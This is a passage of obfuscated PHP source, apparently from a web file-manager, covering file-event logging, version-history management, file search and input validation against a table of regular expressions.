addSystemLog($cˆя, $Bش) { $BՂѩ =& $_SERVER[놫Ӱ]; if ($cˆя == $BՂѩ[2171]) { $cˆя = $Bش[$BՂѩ[401]][$BՂѩ[2172]]; } else { if (in_array($cˆя, array($BՂѩ[1979], $BՂѩ[2173]))) { $cˆя = $Bش[$BՂѩ[401]][$BՂѩ[677]]; } } $DǇ˲ = array_merge($Bش, array($BՂѩ[2174] => $Bش[$BՂѩ[366]], $BՂѩ[2175] => $Bش[$BՂѩ[2175]])); Model($BՂѩ[1944])->addLog($BՂѩ[2176] . $cˆя, $DǇ˲); } private function isCacheEvent($e˻, $e򠮸) { if ($e˻[$_SERVER[놫Ӱ][368]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($F栍ѯ, $Dꐤ) { $d =& $_SERVER[놫Ӱ]; $C޶ᕄ = Model($d[1075])->sourceInfo($F栍ѯ); $a䬊 = array($d[2172] => $Dꐤ, $d[28] => $C޶ᕄ[$d[28]]); return $this->addEvent($F栍ѯ, $d[2171], $a䬊); } public function eventFileEdit($dӂ£) { return $this->addEvent($dӂ£, $_SERVER[놫Ӱ][1971]); } public function eventRecycle($Fﺗ̹, $C) { return $this->addEvent($Fﺗ̹, $_SERVER[놫Ӱ][2173], $C); } public function eventRemove($Cӧ) { $bМҤ =& $_SERVER[놫Ӱ]; $Bʔɼҏ = Model($bМҤ[1075])->sourceInfo($Cӧ); $A܌ = $Bʔɼҏ[$bМҤ[28]]; return $this->addEvent($Bʔɼҏ[$bМҤ[457]], $bМҤ[1970], $A܌); } public function eventShare($aꋸ̒, $F) { return $this->addEvent($aꋸ̒, $_SERVER[놫Ӱ][1979], $F); } public function eventMove($b֮𼄎, $E, $cڨѺބ) { goto f; Cܣ󆾦: $this->addEvent($b֮𼄎, $CŘÊ[484], $Cʙ); $dժ = $dҹЅ->sourceInfo($b֮𼄎); $Cʙ = array($CŘÊ[366] => $dժ[$CŘÊ[366]], $CŘÊ[28] => $dժ[$CŘÊ[28]]); goto D; f: $CŘÊ =& $_SERVER[놫Ӱ]; $dҹЅ = Model($CŘÊ[1075]); $dժ = $dҹЅ->sourceInfo($b֮𼄎); goto e; e: $C쎄 = $dҹЅ->sourceInfo($E); $C = $dҹЅ->sourceInfo($cڨѺބ); $Cʙ = array($CŘÊ[978] => $E, $CŘÊ[2177] => $C쎄[$CŘÊ[28]], $CŘÊ[2178] => $C쎄[$CŘÊ[462]], $CŘÊ[979] => $cڨѺބ, $CŘÊ[2179] => $C[$CŘÊ[28]], $CŘÊ[2180] => $C[$CŘÊ[462]]); goto Cܣ󆾦; D: $this->addEvent($E, $CŘÊ[2181], $Cʙ); goto a񵲺; a񵲺: } public function eventCopy($fތ) { $this->eventCreate($fތ, $_SERVER[놫Ӱ][482]); } public function eventRename($Fڌں۳, $c, $Dö) { $d =& $_SERVER[놫Ӱ]; $D؈ˍ = array($d[978] => $c, $d[979] => $Dö); return $this->addEvent($Fڌں۳, $d[1087], $D؈ˍ); } public function eventAddComment($D͗Ű, $a) { return $this->addEvent($D͗Ű, $_SERVER[놫Ӱ][2182], $a); } public function eventAddDesc($eѡ, $E) { return $this->addEvent($eѡ, $_SERVER[놫Ӱ][2183], $E); } public function listBySource($e䗊) { goto CĆ; CĆ: $Fʎυ =& $_SERVER[놫Ӱ]; $d = Model($Fʎυ[1075])->sourceInfo($e䗊); $c = array($Fʎυ[380] => $e䗊); goto B; aԛ: $dܔ = $this->eventListParse($dܔ, $e䗊); show_json($dܔ); goto E; B: if ($d[$Fʎυ[367]] == $Fʎυ[493]) { $Cɝۏ = Model($Fʎυ[1075])->listSearchChildren($e䗊, 20000); $Cɝۏ[] = $e䗊; $c = array($Fʎυ[366] => array($Fʎυ[7], $Cɝۏ)); } $dܔ = $this->where($c)->order($Fʎυ[2184])->selectPage(); if ($dܔ[$Fʎυ[347]][$Fʎυ[348]] == 0) { $dܔ[$Fʎυ[347]][$Fʎυ[348]] = 1; $dܔ[$Fʎυ[350]] = array(array($Fʎυ[380] => $e䗊, $Fʎυ[2169] => $d[$Fʎυ[457]], $Fʎυ[1330] => $d[$Fʎυ[375]], $Fʎυ[385] => $Fʎυ[2185], $Fʎυ[386] => $d[$Fʎυ[184]], $Fʎυ[1332] => $Fʎυ[33])); } goto aԛ; E: } private function eventListParse($a, $e) { goto FҖ; F̳ʻ: return $a; goto DͽǺύ; aǪ: $Cɧ = array_to_keyvalue($Cݳۺ, $a[33], $a[2175]); foreach ($Cݳۺ as $Bˠ) { $bג䂺 = $Bˠ[$a[401]]; if ($Bˠ[$a[29]] == $a[484] && isset($bג䂺[$a[978]])) { $d򖕯[] = $bג䂺[$a[978]]; $d򖕯[] = $bג䂺[$a[979]]; } if ($Bˠ[$a[29]] == $a[2181] && isset($bג䂺[$a[366]])) { $d򖕯[] = $bג䂺[$a[366]]; } } $d򖕯 = array_merge($d򖕯, $Cɧ, array($e)); goto eǬ; FҖ: $a =& $_SERVER[놫Ӱ]; $Cݳۺ = $a[$a[350]]; $d򖕯 = array_to_keyvalue($Cݳۺ, $a[33], $a[366]); goto aǪ; eǬ: $d򖕯 = array_unique($d򖕯); $E = array_unique(array_to_keyvalue($Cݳۺ, $a[33], $a[1339])); $FҚݷ = Model($a[469])->userListInfo($E); goto cѤ; cѤ: $DꇜҮ = Model($a[747])->sourceListInfo($d򖕯, !0); foreach ($Cݳۺ as &$Bˠ) { goto Eņ; C: $Bˠ[$a[388]] = $DꇜҮ[$Bˠ[$a[366]]]; $Bˠ[$a[2186]] = $DꇜҮ[$Bˠ[$a[2175]]]; if ($Bˠ[$a[29]] == $a[1970]) { $Bˠ[$a[2186]] = $Bˠ[$a[388]]; $Bˠ[$a[2175]] = $Bˠ[$a[2186]][$a[366]]; $Bˠ[$a[388]] = !1; $Bˠ[$a[366]] = $a[33]; } goto cڦ; Eņ: $bג䂺 =& $Bˠ[$a[401]]; if ($Bˠ[$a[29]] == $a[484] && isset($bג䂺[$a[978]])) { $bג䂺[$a[978]] = $DꇜҮ[$bג䂺[$a[978]]]; $bג䂺[$a[979]] = $DꇜҮ[$bג䂺[$a[979]]]; } if ($Bˠ[$a[29]] == $a[2181] && isset($bג䂺[$a[366]])) { $bג䂺[$a[366]] = $DꇜҮ[$bג䂺[$a[366]]]; } goto C; cڦ: $Bˠ[$a[2140]] = $FҚݷ[$Bˠ[$a[1339]]]; goto d뷘; d뷘: } $a[$a[350]] = $Cݳۺ; goto F̳ʻ; DͽǺύ: } public function removeBySource($f׊ޢ) { $E͍ι = array($_SERVER[놫Ӱ][380] => $f׊ޢ); $this->where($E͍ι)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\x75\x72\143\145\137\x68\x69\x73\164\x6f\162\171"; public function addHistory($eˡȓ, $B = '') { $cС =& $_SERVER[놫Ӱ]; $F𠴱 = array($cС[380] => $eˡȓ[$cС[366]], $cС[1330] => isset($eˡȓ[$cС[376]]) ? $eˡȓ[$cС[376]] : $eˡȓ[$cС[375]], $cС[416] => $eˡȓ[$cС[415]], $cС[513] => $eˡȓ[$cС[78]], $cС[2187] => $B); $fٓ = $GLOBALS[$cС[6]][$cС[84]][$cС[2188]]; if ($fٓ > 1) { $this->historyAutoClear($F𠴱[$cС[366]]); $this->add($F𠴱); } Model($cС[2189])->eventFileEdit($eˡȓ[$cС[366]]); } private function historyAutoClear($C) { goto C; a䊽ˤ: if ($Dٻ >= 500) { return; } $b幐˒ = array($b҃[380] => $C); $Bݦ = $this->field($b҃[2192])->where($b幐˒)->order($b҃[2184])->select(); goto Dà; C: $b҃ =& $_SERVER[놫Ӱ]; $bӡ = Model($b҃[1055])->get($b҃[2190]); $Aҵ˦ = $GLOBALS[$b҃[6]][$b҃[84]][$b҃[2188]]; goto bӖů; Dà: if (!$Bݦ || $Dٻ >= count($Bݦ)) { return; } $Fϝ = array_to_keyvalue($Bݦ, $b҃[33], $b҃[364]); $Fϝ = array_slice($Fϝ, $Dٻ); goto Eˊ; f: $b幐˒ = array($b҃[382] => array($b҃[7], $Fϝ)); $this->where($b幐˒)->delete(); Model($b҃[418])->remove($dޏ); goto f; Eˊ: $dޏ = array_to_keyvalue($Bݦ, $b҃[33], $b҃[415]); $dޏ = array_slice($dޏ, $Dٻ); if (!$Fϝ || !$dޏ) { return; } goto f; bӖů: $Dט뗻 = $bӡ == $b҃[2191] ? 3 : $Aҵ˦; if ($Aҵ˦ <= 1) { $Dט뗻 = 1; } $Dٻ = $Dט뗻 - 1; goto a䊽ˤ; f: } public function listData($F) { goto bҪٻ; AӔ: $fߊ = $this->field($fʚ)->where($E˭쎄)->order($d[2184])->selectPage(); $this->_listAppendUser($fߊ[$d[350]]); $C = Model($d[1055])->get($d[2190]); goto eӳ; bҪٻ: $d =& $_SERVER[놫Ӱ]; $E˭쎄 = array($d[380] => $F); $fʚ = $d[2193]; goto AӔ; eӳ: $AɊ = 3; if ($C == $d[2191]) { $fߊ[$d[350]] = array_slice($fߊ[$d[350]], 0, $AɊ); $fߊ[$d[347]] = array($d[2194] => 1, $d[2195] => 20, $d[2196] => 1, $d[2197] => count($fߊ[$d[350]])); } return $fߊ; goto D֊н; D֊н: } protected function _listAppendUser(&$AØ) { $Bܝ =& $_SERVER[놫Ӱ]; $dُҹ = array_to_keyvalue($AØ, $Bܝ[33], $Bܝ[1339]); $b੠ = Model($Bܝ[469])->userListInfo($dُҹ); foreach ($AØ as &$E) { $e̢ś = $E[$Bܝ[1339]]; $E[$Bܝ[375]] = $b੠[$e̢ś] ? $b੠[$e̢ś] : !1; } } public function fileInfo($dѥǂ) { $B =& $_SERVER[놫Ӱ]; $e莧 = $this->tablePrefix; $fǢާΪ = "{$e莧}\151\x6f\x5f\146\151\154\x65\x20\x66\x69\154\145\x73\40\x6f\156\40\x66\151\x6c\x65\163\56\146\x69\154\x65\111\104\40\x3d\x20\150\x69\x73\x74\x6f\x72\171\56\146\x69\x6c\145\x49\x44"; return $this->alias($B[2198])->where(array($B[382] => $dѥǂ))->join($fǢާΪ, $B[2199])->find(); } public function removeItem($eɰڛ) { $d =& $_SERVER[놫Ӱ]; $E = array($d[382] => $eɰڛ); $Fй = $this->where($E)->find(); if ($Fй) { $e˾ = $this->where($E)->delete(); Model($d[418])->remove($Fй[$d[415]]); return $e˾; } return !1; } public function removeBySource($Aɍ袶) { goto c܍; a: $Fޙ = array($B巍[380] => array($B巍[7], $Aɍ袶)); $E = $this->field($B巍[416])->where($Fޙ)->select(); if ($E) { $this->where($Fޙ)->delete(); $b = array_to_keyvalue($E, $B巍[33], $B巍[415]); Model($B巍[418])->remove($b); } goto dɡܻ; dɡܻ: return !0; goto d荻; c܍: $B巍 =& $_SERVER[놫Ӱ]; if (!$Aɍ袶) { return !1; } if (!is_array($Aɍ袶)) { $Aɍ袶 = array($Aɍ袶); } goto a; d荻: } public function setDetail($e, $Eŧ) { $C؞ =& $_SERVER[놫Ӱ]; return $this->where(array($C؞[382] => $e))->save(array($C؞[2187] => $Eŧ)); } public function rollbackToItem($Dȯ, $A) { goto dυ; dυ: $bത =& $_SERVER[놫Ӱ]; $d͖ = Model($bത[747])->sourceInfo($Dȯ); $this->addHistory($d͖); goto DǏ; fʜ: return $this->where(array($bത[382] => $A))->delete(); goto Cײ; DǏ: $Cְ = $this->find($A); $Dś = array($bത[415] => $Cְ[$bത[415]], $bത[78] => $Cְ[$bത[78]], $bത[106] => time(), $bത[376] => USER_ID); Model($bത[747])->where(array($bത[366] => $Dȯ))->save($Dś); goto fʜ; Cײ: } public function clearSame($B) { goto e뚃ճ; e݉: $E뼒 = array(); $Dԝ͖ = array(); foreach ($C㞄Ӽ as $A) { if (count($A) <= 1) { continue; } foreach ($A as $b䊣) { $E뼒[] = $b䊣[$Cè[415]]; $Dԝ͖[] = $b䊣[$Cè[364]]; } } goto e͊ς; e͊ς: if (!$Dԝ͖) { return; } $this->where(array($Cè[364] => array($Cè[7], $Dԝ͖)))->delete(); Model($Cè[418])->remove($E뼒); goto A; e뚃ճ: $Cè =& $_SERVER[놫Ӱ]; $F뛴 = $this->listData($B); $C㞄Ӽ = array_to_keyvalue_group($F뛴, $Cè[415]); goto e݉; A: } public function userSpace() { $f =& $_SERVER[놫Ӱ]; $B = $this->tablePrefix; $dǛȞ = array($f[1330] => USER_ID); $DȪ = "{$B}\151\157\137\x66\151\154\x65\x20\x66\151\154\145\x73\x20\x6f\x6e\x20\x66\151\x6c\x65\163\x2e\x66\151\x6c\145\x49\104\x20\75\40\150\x69\163\x74\x6f\162\x79\x2e\146\x69\154\x65\x49\x44"; return $this->alias($f[2198])->where($dǛȞ)->join($DȪ, $f[2199])->sum($f[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Bϔ) { goto D߶ֱ; D߶ֱ: $b¢̆ =& $_SERVER[놫Ӱ]; $E = KodIO::fileTypeList(); $Aȏ = $E[$Bϔ]; goto F̌; F̌: if (!$Aȏ) { return array(); } $D = $Aȏ[$b¢̆[157]]; $e = $b¢̆[7]; goto d܄޴; d܄޴: if (!$Aȏ[$b¢̆[157]]) { $D۞ʭÇ = array_to_keyvalue($E, $b¢̆[33], $b¢̆[157]); $D = implode($b¢̆[47], $D۞ʭÇ); $e = $b¢̆[2158]; } $d = explode($b¢̆[47], trim($D, $b¢̆[47])); return array($e, $d); goto FӐ琺; FӐ琺: } public function listPathType($Bя) { $D =& $_SERVER[놫Ӱ]; $cٻ = $this->fileTypeWhere($Bя); if (!$cٻ) { return array(); } $aկǇ = array($D[514] => SourceModel::TYPE_USER, $D[515] => USER_ID, $D[511] => 0, $D[512] => $cٻ); return $this->listSource($aկǇ); } public function listSearch($dݏݥ, $d = 300) { goto CӡҨ; Eݐʏ: $this->_listSearchBindPinyin($dݏݥ, $b, $B); $this->alias($Dڭ[479])->_makeOrder()->cache(null, 10); $E = $this->distinct(!0)->field($B)->where($b)->selectPage($d); goto D鬯; CӡҨ: $Dڭ =& $_SERVER[놫Ӱ]; if (isset($dݏݥ[$Dڭ[2083]]) && $dݏݥ[$Dڭ[2083]]) { $dݏݥ[$Dڭ[2083]] = str_replace($Dڭ[1490], $Dڭ[2200], trim($dݏݥ[$Dڭ[2083]])); } $b = $this->_parseSearchWhere($dݏݥ); goto d; D鬯: $this->_listSearchDesc($E, $dݏݥ, $E); $this->_listSearchTag($E, $dݏݥ, $E); $this->_listDataApply($E[$Dڭ[350]]); goto Aʈڍ; Aʈڍ: $this->_listMake($E); return $E; goto D; d: if (!isset($b[$Dڭ[393]])) { $b[$Dڭ[393]] = 0; } $B = $Dڭ[2201]; $E = $B; goto Eݐʏ; D: } private function _listSearchTag(&$f, $Fנ, $eƄ) { goto c瘍; Dɡ۾: $a = array(); $F = $Fנ[$D톄݃[2083]]; foreach ($b܃ as $fȈ) { $a = $fȈ[$D톄݃[28]]; $Fٷ = str_replace($D톄݃[50], $D톄݃[33], Pinyin::encode($a)); if (stripos($a, $F) !== !1 || stripos($Fٷ, $F) !== !1) { $a[] = $fȈ[$D톄݃[364]]; } } goto Aա; c瘍: $D톄݃ =& $_SERVER[놫Ӱ]; if (!$Fנ[$D톄݃[2083]] || $f[$D톄݃[347]][$D톄݃[336]] > 1) { return; } $b܃ = Model($D톄݃[2202])->listData(); goto Dɡ۾; Aա: if (!$a) { return; } $D醘 = array($D톄݃[390] => array($D톄݃[7], $a)); $CŘ웂 = Model($D톄݃[2203])->field($D톄݃[76])->where($D醘)->select(); goto C݆; C݆: $CŘ웂 = array_to_keyvalue($CŘ웂, $D톄݃[33], $D톄݃[76]); $Fؔ = array_unique($CŘ웂); $this->_listSearchMerge($f, $Fנ, $eƄ, $Fؔ); goto f븸; f븸: } private function _listSearchDesc(&$D, $bډ, $Fڣ) { goto Fߢ; c쥈: $C = array_unique($C); if (!$C) { return; } $B = array($c⺻ț[366] => array($c⺻ț[7], $C), $c⺻ț[88] => $c⺻ț[401], $c⺻ț[354] => array($c⺻ț[746], $c⺻ț[2085] . $bډ[$c⺻ț[2083]] . $c⺻ț[2085])); goto F胢; F胢: $bϹ = Model($c⺻ț[497])->field($c⺻ț[366])->where($B)->select(); $f˯ = array_to_keyvalue($bϹ, $c⺻ț[33], $c⺻ț[366]); $this->_listSearchMerge($D, $bډ, $Fڣ, $f˯); goto aƼʨ; Fߢ: $c⺻ț =& $_SERVER[놫Ӱ]; if (!$bډ[$c⺻ț[2083]] || $D[$c⺻ț[347]][$c⺻ț[336]] > 1) { return; } $C = $this->listSearchChildren($bډ[$c⺻ț[457]]); goto c쥈; aƼʨ: } private function _listSearchMerge(&$aꔽ, $EӬؙ, $BՐ, $aӿ) { goto D; C˩: $A˙ = $this->field($BՐ)->where($Bά)->select(); if (!$A˙) { return; } $f = array(); goto cу݊; cу݊: foreach ($A˙ as $E) { $fȟ = $e[47] . $EӬؙ[$e[457]] . $e[47]; if (stripos($E[$e[455]], $fȟ) !== !1) { $f[] = $E; } } $aꔽ[$e[350]] = array_merge($f, $aꔽ[$e[350]]); $aꔽ[$e[347]][$e[348]] += count($f); goto F㢅; D: $e =& $_SERVER[놫Ӱ]; if (!$aӿ) { return; } $Aձ = array_to_keyvalue($aꔽ[$e[350]], $e[33], $e[366]); goto C; C: $b匟 = array_diff($aӿ, $Aձ); if (!$b匟) { return; } $Bά = array($e[366] => array($e[7], $b匟)); goto C˩; F㢅: } public function listSearchChildren($eސѮ, $Eᬙ = 5000) { goto fK; A: $c = $this->field($a[366])->where($d퉉)->select(); $b߷ = array_to_keyvalue($c, $a[33], $a[366]); return $b߷; goto EɅ; DǤ: $d퉉 = array($a[455] => array($a[746], $dєΊ[$a[455]] . $dєΊ[$a[366]] . $a[476])); $c = $this->field($a[366])->where($d퉉)->count(); if ($c > $Eᬙ) { return $this->_listSearchChildrenNear($eސѮ, $Eᬙ); } goto A; fK: $a =& $_SERVER[놫Ӱ]; $b߷ = array(); $dєΊ = $this->sourceInfo($eސѮ); goto DǤ; EɅ: } private function _listSearchChildrenNear($b´, $F͌) { goto Fˍ鄩; A: $Eߩ = $this->field($d[2204])->where($Bħ)->select(); $dǐغ = array_to_keyvalue(array_filter_by_field($Eߩ, $d[367], $d[493]), $d[33], $d[366]); $Cֆ = array_merge($Cֆ, array_to_keyvalue($Eߩ, $d[33], $d[366])); goto E߬; Fˍ鄩: $d =& $_SERVER[놫Ӱ]; $Cֆ = array(); $Bħ = array($d[457] => $b´); goto A; E߬: if (!$dǐغ) { return $Cֆ; } $Bħ = array($d[457] => array($d[7], $dǐغ)); $Eߩ = $this->field($d[2204])->where($Bħ)->select(); goto Fɣ; Fɣ: $Cֆ = array_merge($Cֆ, array_to_keyvalue($Eߩ, $d[33], $d[366])); $Cֆ = array_slice($Cֆ, 0, $F͌); return $Cֆ; goto Fލ; Fލ: } private function _listSearchBindPinyin($dà, &$D, &$A) { goto aҽů; e: $d[] = array($D¼[2208] => $a, $D¼[907] => $D¼[2087], array($D¼[2209] => $a, $D¼[2210] => array($D¼[7], array($D¼[412], $D¼[411])))); $this->join($C); $D = $d; goto e̍܏; fę: $d = array(); $A = str_replace(array($D¼[214], $D¼[50], $D¼[2205]), $D¼[33], $A); $A = $D¼[2206] . str_replace($D¼[47], $D¼[2207], $A); goto b¦; aҽů: $D¼ =& $_SERVER[놫Ӱ]; if (!Input::check($dà[$D¼[2083]], $D¼[303]) || strlen($dà[$D¼[2083]]) < 2) { return; } $C = "\114\105\x46\124\x20\x4a\117\x49\x4e\x20{$this->tablePrefix}\x69\157\137\163\x6f\165\x72\143\x65\137\x6d\145\164\x61\40\x6d\145\x74\141\x20\x6f\156\40\163\157\x75\x72\143\145\56\163\157\165\162\x63\145\111\104\x20\x3d\x20\155\145\164\141\56\x73\157\165\x72\x63\x65\111\x44"; goto fę; b¦: unset($D[$D¼[28]]); foreach ($D as $bϹޜ => $A،䶲) { $d[$D¼[2206] . $bϹޜ] = $A،䶲; } $a = array($D¼[475], $D¼[2085] . $dà[$D¼[2083]] . $D¼[2085]); goto e; e̍܏: } private function _parseSearchWhere($dՄ) { goto d푵; d푵: $d =& $_SERVER[놫Ӱ]; $A鞍 = array(); if (isset($dՄ[$d[687]])) { $A鞍[$d[106]] = array($d[2211], $dՄ[$d[687]]); } goto f슸; f尊: if (isset($dՄ[$d[2083]]) && $dՄ[$d[2083]]) { $C = $dՄ[$d[2083]]; $AϔΡ = explode($d[50], $C); if (strlen($C) > 2 && (substr($C, 0, 1) == $d[112] && substr($C, -1) == $d[112]) || substr($C, 0, 1) == $d[55] && substr($C, -1) == $d[55]) { $C = substr($C, 1, -1); $AϔΡ = array($C); } $A鞍[$d[28]] = array($d[475], $d[2085] . $C . $d[2085]); if (count($AϔΡ) > 1) { $A鞍[$d[28]] = array(); foreach ($AϔΡ as $a׳) { if (!trim($a׳)) { continue; } $A鞍[$d[28]][] = array($d[475], $d[2085] . trim($a׳) . $d[2085]); } } } return $A鞍; goto d; f슸: if (isset($dՄ[$d[688]])) { $eԈ = array($d[2212], $dՄ[$d[688]]); if ($A鞍[$d[106]]) { $A鞍[$d[106]] = array($A鞍[$d[106]], $eԈ, $d[2213]); } else { $A鞍[$d[106]] = $eԈ; } } if (isset($dՄ[$d[2214]])) { $A鞍[$d[78]] = array($d[2211], $dՄ[$d[2214]]); } if (isset($dՄ[$d[2215]])) { $eԈ = array($d[2212], $dՄ[$d[2215]]); if ($A鞍[$d[78]]) { $A鞍[$d[78]] = array($A鞍[$d[78]], $eԈ, $d[2213]); } else { $A鞍[$d[78]] = $eԈ; } } goto A; A: if (isset($dՄ[$d[527]])) { $A鞍[] = array($d[376] => $dՄ[$d[527]], $d[375] => $dՄ[$d[527]], $d[907] => $d[2087]); } if (isset($dՄ[$d[369]])) { $eګ = $dՄ[$d[369]]; if ($eګ == $d[77]) { $A鞍[$d[367]] = 1; } else { if ($eګ == $d[2216]) { $A鞍[$d[367]] = 0; } else { if ($eګ) { $eګ = is_array($eګ) ? $eګ : explode($d[47], $eګ); $A鞍[$d[369]] = array($d[381], $eګ); $A鞍[$d[367]] = 0; } } } } if (isset($dՄ[$d[457]])) { $Bڮ = $this->sourceInfo($dՄ[$d[457]]); $A鞍[$d[518]] = array($d[475], $Bڮ[$d[455]] . $dՄ[$d[457]] . $d[476]); } goto f尊; d: } } goto dˆ; A: if (!function_exists($_SERVER[놫Ӱ][1772])) { function imagecreatefrombmp($a) { return ImageGdBMP::load($a); } } class Input { public static function getArray($BЬ) { goto c; c: $c܎ۯ =& $_SERVER[놫Ӱ]; global $in; $E㈴Н = array(); goto a㓿; a㓿: $Cꂾ = array(); $Dច = LNG($c܎ۯ[1773]); foreach ($BЬ as $Dţ䰲 => $Cܨ) { goto c㪐ݒ; Eͭ: if (isset($Cܨ[$c܎ۯ[1777]]) && !self::check($in[$Dţ䰲], $Cܨ[$c܎ۯ[1777]], $DЬϙ)) { if (array_key_exists($c܎ۯ[1776], $Cܨ)) { if (!is_null($Cܨ[$c܎ۯ[1776]])) { $E㈴Н[$e] = $Cܨ[$c܎ۯ[1776]]; } } else { $Cꂾ[] = $Bŉգ; } continue; } $E㈴Н[$e] = $in[$Dţ䰲]; goto C; c㪐ݒ: $Bŉգ = _get($Cܨ, $c܎ۯ[1774], $Dច . $c܎ۯ[873] . $Dţ䰲); $e = $Dţ䰲; if (isset($Cܨ[$c܎ۯ[1775]]) && $Cܨ[$c܎ۯ[1775]]) { $e = $Cܨ[$c܎ۯ[1775]]; } goto eȴݻ; eȴݻ: if (!array_key_exists($Dţ䰲, $in)) { if (array_key_exists($c܎ۯ[1776], $Cܨ)) { if (!is_null($Cܨ[$c܎ۯ[1776]])) { $E㈴Н[$e] = $Cܨ[$c܎ۯ[1776]]; } } else { if (isset($Cܨ[$c܎ۯ[1777]])) { $Cꂾ[] = $Bŉգ; } } continue; } if (isset($Cܨ[$c܎ۯ[1777]]) && $Cܨ[$c܎ۯ[1777]] == $c܎ۯ[279]) { $dө = json_decode($in[$Dţ䰲], !0); if (is_array($dө)) { $E㈴Н[$e] = $dө; } else { if (array_key_exists($c܎ۯ[1776], $Cܨ)) { if (!is_null($Cܨ[$c܎ۯ[1776]])) { $E㈴Н[$e] = $Cܨ[$c܎ۯ[1776]]; } } else { $Cꂾ[] = $Bŉգ; } } continue; } $DЬϙ = _get($Cܨ, $c܎ۯ[983]); goto Eͭ; C: } goto C뉞; C뉞: if (count($Cꂾ) > 0) { show_json(implode($c܎ۯ[1778], $Cꂾ), !1); } return $E㈴Н; goto eٱᄶ; eٱᄶ: } public static function reg($FͿ = "\x72\x65\161\165\x69\162\145") { static $aē = array("\x72\x65\x71\165\151\x72\145" => "\x2e\x2b", "\x6e\x75\x6d\142\145\x72" => "\x5c\144\53", "\x68\x65\x78" => "\133\60\55\x39\101\x2d\106\141\55\146\x5d\53", "\x69\156\x74" => "\133\x2d\x5c\x2b\x5d\x3f\134\x64\x2b", "\x62\x6f\x6f\154" => "\60\174\61", "\x66\x6c\x6f\x61\x74" => "\133\x2d\x5c\53\135\x3f\x5c\144\53\50\134\x2e\134\144\x2b\51\x3f", "\145\x6e\147\154\151\163\x68" => "\x5b\101\55\x5a\141\x2d\172\40\x5d\53", "\x63\150\151\156\145\163\145" => "\133\x5c\x78\173\x34\x65\x30\x30\175\x2d\x5c\170\173\71\146\141\65\x7d\x5d\53", "\x68\x61\x73\x43\x68\151\156\x65\163\x65" => "\x2f\x28\x5b\134\170\x7b\x34\145\60\x30\x7d\55\134\170\x7b\71\x66\141\x35\x7d\x5d\x2b\51\57\165", "\x65\x6d\x61\x69\154" => "\134\167\53\50\x5b\x5c\56\134\55\x5d\x5c\167\53\51\x2a\134\x40\134\167\x2b\x28\x5b\134\56\134\x2d\x5d\134\167\53\51\52\134\56\x5c\x77\x2b", "\160\x68\x6f\156\x65" => "\x31\x5b\63\x2d\x39\x5d\x5c\x64\x7b\x39\175", "\x74\x65\154\160\150\x6f\x6e\145" => "\x28\x5c\50\x5c\144\173\63\54\x34\x7d\x5c\x29\174\134\x64\x7b\x33\x2c\x34\x7d\x2d\x7c\134\x73\51\77\x5c\144\173\x37\54\61\64\x7d", "\x75\162\x6c" => "\50\150\164\x74\160\174\146\x74\160\x7c\150\x74\x74\x70\x73\x29\72\x5c\57\134\57\x5b\x5c\x77\134\55\x5f\135\53\x28\x5c\56\x5b\x5c\167\134\55\x5f\x5d\x2b\x29\x2b\50\x5b\134\x77\x5c\x2d\134\x2e\x2c\x40\77\136\x3d\45\46\x3a\134\57\176\134\53\x23\x5d\52\x5b\134\x77\134\x2d\134\x40\77\x5e\75\45\46\134\57\x7e\x5c\x2b\43\x5d\51\77", "\165\x72\x6c\106\x75\x6c\154" => "\133\141\x2d\172\x41\x2d\x7a\x5d\53\x3a\134\x2f\134\x2f\133\136\x5c\163\135\52", "\151\160" => "\x28\134\x64\173\61\54\x33\x7d\x5c\56\51\173\63\x7d\50\x5c\144\173\61\x2c\63\x7d\51", "\172\x69\x70" => "\x5b\x31\55\71\x5d\134\x64\x7b\x35\175\x28\x3f\x21\x5c\144\51", "\x69\144\x43\141\162\x64" => "\50\x5c\144\x7b\61\65\175\x29\x7c\x28\134\x64\173\61\67\x7d\x28\x5c\144\x7c\130\x7c\170\51\x29", "\143\x6f\x6c\157\162" => "\43\50\x5b\x30\55\x39\101\x2d\106\141\x2d\x66\x5d\x7b\63\175\174\133\x30\x2d\71\x41\x2d\106\141\x2d\x66\135\173\x36\x7d\x29", "\164\x69\x6d\x65" => "\x28\133\x30\x2d\61\x5d\x5c\144\174\x32\133\x30\x2d\x34\135\51\x3a\133\x30\55\65\135\x5c\x64", "\144\141\164\x65" => "\134\x64\x7b\64\x7d\133\x2d\134\x2f\135\x3f\50\60\x5b\x31\55\71\x5d\x7c\x31\x5b\60\55\62\x5d\51\133\x2d\134\57\x5d\77\x28\x5b\x30\55\x32\x5d\134\144\174\63\133\60\55\61\135\51", "\x64\141\x74\x65\x54\x69\x6d\x65" => "\x5c\144\x7b\x34\175\x5b\55\x5c\57\135\x3f\x28\x30\133\61\55\x39\x5d\174\x31\133\x30\x2d\62\135\x29\x5b\x2d\134\x2f\135\x3f\50\x5b\60\x2d\x32\135\x5c\144\174\63\133\60\x2d\61\x5d\51\134\x73\53\x28\133\x30\55\x31\135\x5c\x64\x7c\x32\x5b\x30\55\64\135\51\x3a\133\x30\x2d\65\135\x5c\x64", "\x70\141\x73\x73\167\x6f\162\x64" => "\50\77\75\56\x2a\x5c\x64\51\x28\x3f\75\x2e\52\133\x61\55\x7a\x5d\x29\50\x3f\x3d\56\52\133\x41\55\x5a\135\x29\56\x7b\x38\x2c\62\x30\x7d", "\153\145\171" => "\133\x41\x2d\132\141\55\x7a\60\55\71\x5f\x5c\x2d\134\x2e\x5d\x2b", "\153\x65\x79\106\x75\154\154" => "\133\101\x2d\132\x61\55\x7a\60\55\71\137\x5c\x2d\134\x2e\134\163\x2c\135\53"); if (!$FͿ) { return $aē; } return $aē[$FͿ]; } public static function check($E͏, $Bݕ, $bÊ = null) { $C¦ =& $_SERVER[놫Ӱ]; switch ($Bݕ) { case $C¦[7]: return in_array($E͏, $bÊ); break; case $C¦[1779]: return floatval($E͏) > $bÊ; break; case $C¦[1780]: return floatval($E͏) < $bÊ; break; case $C¦[322]: return strlen($E͏) >= $bÊ[0] && strlen($E͏) <= $bÊ[1]; break; case $C¦[322]: if (is_array($bÊ)) { return strlen($E͏) >= $bÊ[0] && strlen($E͏) <= $bÊ[1]; break; } else { return strlen($E͏) == $bÊ; break; } case $C¦[318]: return floatval($E͏) >= $bÊ[0] && floatval($E͏) <= $bÊ[1]; break; } $aو = self::reg(!1); $Bݕ = isset($aو[$Bݕ]) ? $aو[$Bݕ] : $Bݕ; if 